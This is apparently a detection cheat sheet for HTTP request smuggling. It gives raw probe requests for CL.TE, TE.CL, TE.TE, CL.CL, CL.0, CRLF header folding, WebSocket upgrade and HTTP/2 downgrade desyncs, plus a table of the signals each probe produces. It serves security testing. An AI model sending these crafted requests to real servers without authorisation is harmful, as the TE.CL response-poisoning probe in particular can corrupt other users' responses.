# Desync detection — the systematic sweep

## The baseline — the ordinary request

```text
POST / HTTP/1.1
Host: t
Content-Length: 4

A=1&
```

The control — the response is the baseline — `detection-oracle.md`.

## The CL.TE probe — the hang-check

```text
POST / HTTP/1.1
Host: t
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

3x repetition — consistent hang + absent-on-control → CL.TE —
`detection.md`.

## The TE.CL probe — the 404-poison

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /404-poison HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

Then `GET /` — the response is the 404's → TE.CL — `detection.md`.

## The TE.TE probe — the obfuscation-matrix

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GET /404 HTTP/1.1
...
```

The obfuscation that produces the 404 → TE.TE — `obfuscation.md`.

## The CL.CL probe — the dup-CL

```text
POST / HTTP/1.1
Host: t
Content-Length: 4
Content-Length: 7

A=1&B=2
```

`cl-manipulation.md`.

## The CL.0 probe — the body-ignored

```text
POST /ignored HTTP/1.1
Host: t
Content-Length: 60

GET /marker HTTP/1.1
Host: t
```

`client-side-desync.md`.

## The fold probe — `%0d%0a` in a param

```text
GET /?host=x%0d%0aX-Inj:%201 HTTP/1.1
```

`crlf-injection.md`.

## The upgrade probe — `Upgrade: ws`

```text
GET /ws HTTP/1.1
Upgrade: websocket
```

`upgrade-smuggling.md`.

## The h2 probe — `content-length: 0` inside h2

```text
:method POST :path / content-length 0
```

`http2-smuggling.md`.

## The order — the sequence

`probe-sequences.md` — the full ordered sweep.

## The results — the table

| Probe | Signal | Pair |
|---|---|---|
| `0\r\n\r\nG` | hang | CL.TE |
| `5c\r\nGET /404...` | next-404 | TE.CL |
| `TE:cow` | obfuscation-404 | TE.TE |
| `CL:4 CL:7` | differential | CL.CL |
| `body=GET /marker` | marker | CL.0 |
| `content-length:0` h2 | downgrade | H2.CL |
| `%0d%0a` fold | injected-header | fold |
